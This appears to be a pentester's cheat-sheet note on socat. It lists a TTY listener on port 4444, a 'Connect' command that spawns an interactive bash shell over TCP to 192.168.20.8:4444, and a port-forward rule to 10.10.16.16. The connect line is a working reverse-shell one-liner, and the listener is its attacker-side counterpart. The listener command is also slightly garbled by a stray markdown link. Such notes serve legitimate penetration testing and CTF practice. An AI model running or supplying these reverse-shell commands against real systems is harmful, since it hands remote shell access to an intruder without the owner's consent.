#socat #socatlisten #socatconnect
# Listen 
```
rlwrap socat [file:`tty`](http://file:`tty`/), raw, echo=0 tcp-listen:4444
```
```
stty rows 200 cols 200                            #more row and columns settings
```
# Connect 
```
rlwrap socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp: 192.168.20.8:4444
```
# Port forward 
```
socat TCP4-LISTEN:12345,fork,reuseaddr TCP4:10.10.16.16:12345
```